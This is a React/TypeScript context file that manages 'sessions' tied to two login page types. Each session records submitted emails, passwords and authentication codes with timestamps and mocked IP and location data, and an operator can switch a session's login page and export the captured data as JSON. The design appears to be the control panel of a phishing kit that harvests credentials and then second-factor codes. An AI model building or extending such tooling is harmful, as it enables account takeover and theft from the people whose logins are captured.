
import React, { createContext, useContext, useState, useEffect } from 'react';
import { toast } from '@/hooks/use-toast';

export type PageType = 'login1' | 'login2';

export interface SessionData {
  email?: string;
  password?: string;
  authCode?: string;
  ipAddress?: string;
  location?: string;
  timestamp: string;
}

export interface Session {
  id: string;
  pageType: PageType;
  createdAt: string;
  data: SessionData[];
}

interface SessionContextType {
  sessions: Session[];
  createSession: (pageType: PageType) => string;
  switchPageType: (sessionId: string) => void;
  addSessionData: (sessionId: string, data: Omit<SessionData, 'timestamp'>) => void;
  exportSessionData: (sessionId: string) => void;
  getSession: (sessionId: string) => Session | undefined;
}

const SessionContext = createContext<SessionContextType | undefined>(undefined);

export const useSessionContext = () => {
  const context = useContext(SessionContext);
  if (!context) {
    throw new Error('useSessionContext must be used within a SessionProvider');
  }
  return context;
};

// Generate a random session ID
const generateSessionId = () => {
  return Math.random().toString(36).substring(2, 8);
};

// Mock IP and location generation
const generateMockIpAndLocation = () => {
  const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  const locations = ['New York, US', 'London, UK', 'Sydney, AU', 'Tokyo, JP', 'Berlin, DE', 'Paris, FR', 'Toronto, CA'];
  const location = locations[Math.floor(Math.random() * locations.length)];
  
  return { ip, location };
};

export const SessionProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [sessions, setSessions] = useState<Session[]>(() => {
    const storedSessions = localStorage.getItem('sessions');
    return storedSessions ? JSON.parse(storedSessions) : [];
  });

  // Save sessions to localStorage whenever they change
  useEffect(() => {
    localStorage.setItem('sessions', JSON.stringify(sessions));
  }, [sessions]);

  const createSession = (pageType: PageType): string => {
    const sessionId = generateSessionId();
    const newSession: Session = {
      id: sessionId,
      pageType,
      createdAt: new Date().toISOString(),
      data: []
    };
    
    setSessions(prevSessions => [...prevSessions, newSession]);
    toast({
      title: "Session Created",
      description: `New ${pageType} session created with ID: ${sessionId}`,
    });
    
    return sessionId;
  };

  const switchPageType = (sessionId: string) => {
    setSessions(prevSessions =>
      prevSessions.map(session =>
        session.id === sessionId
          ? { ...session, pageType: session.pageType === 'login1' ? 'login2' : 'login1' }
          : session
      )
    );
    
    toast({
      title: "Page Type Changed",
      description: "The page type has been switched successfully.",
    });
  };

  const addSessionData = (sessionId: string, data: Omit<SessionData, 'timestamp'>) => {
    const { ip, location } = generateMockIpAndLocation();
    
    const sessionData: SessionData = {
      ...data,
      ipAddress: ip,
      location: location,
      timestamp: new Date().toISOString()
    };
    
    setSessions(prevSessions =>
      prevSessions.map(session =>
        session.id === sessionId
          ? { ...session, data: [...session.data, sessionData] }
          : session
      )
    );
  };

  const exportSessionData = (sessionId: string) => {
    const session = sessions.find(s => s.id === sessionId);
    if (!session) return;

    const dataString = JSON.stringify(session.data, null, 2);
    const blob = new Blob([dataString], { type: 'application/json' });
    const url = URL.createObjectURL(blob);

    const a = document.createElement('a');
    a.href = url;
    a.download = `session-${sessionId}-${new Date().toISOString().split('T')[0]}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    toast({
      title: "Data Exported",
      description: "Session data has been exported successfully.",
    });
  };

  const getSession = (sessionId: string) => {
    return sessions.find(session => session.id === sessionId);
  };

  return (
    <SessionContext.Provider value={{
      sessions,
      createSession,
      switchPageType,
      addSessionData,
      exportSessionData,
      getSession
    }}>
      {children}
    </SessionContext.Provider>
  );
};
